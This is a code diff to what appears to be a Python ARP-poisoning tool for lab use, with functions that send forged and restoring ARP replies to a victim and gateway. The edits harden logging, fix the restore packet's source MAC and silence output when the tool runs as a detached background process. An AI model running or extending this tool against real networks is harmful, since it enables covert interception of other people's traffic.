@@ -43,7 +43,10 @@ GATEWAY_IP = os.environ.get("GATEWAY_IP", "10.10.10.1")
 
 def log(msg):
     line = f"[{time.strftime('%H:%M:%S')}] {msg}"
-    print(line, flush=True)
+    try:
+        print(line, flush=True)
+    except (BrokenPipeError, OSError):
+        pass
     try:
         with open(LOG_FILE, "a") as f:
             f.write(line + "\n")
@@ -88,7 +91,7 @@ def send_forged_reply(target_ip, target_mac, spoof_ip, iface=IFACE):
 
 def send_real_reply(target_ip, target_mac, real_ip, real_mac, iface=IFACE):
     """Restore target_ip's table with the correct real mapping."""
-    pkt = Ether(dst=target_mac) / ARP(
+    pkt = Ether(dst=target_mac, src=real_mac) / ARP(
         op=2,
         pdst=target_ip,
         hwdst=target_mac,
@@ -184,6 +187,12 @@ def cmd_start(args):
     os.setsid()
     try:
         sys.stdin.close()
+    except Exception:
+        pass
+    try:
+        devnull = open(os.devnull, "w")
+        sys.stdout = devnull
+        sys.stderr = devnull
     except Exception:
         pass
     poison_loop(args.victim, args.gateway, args.mode)
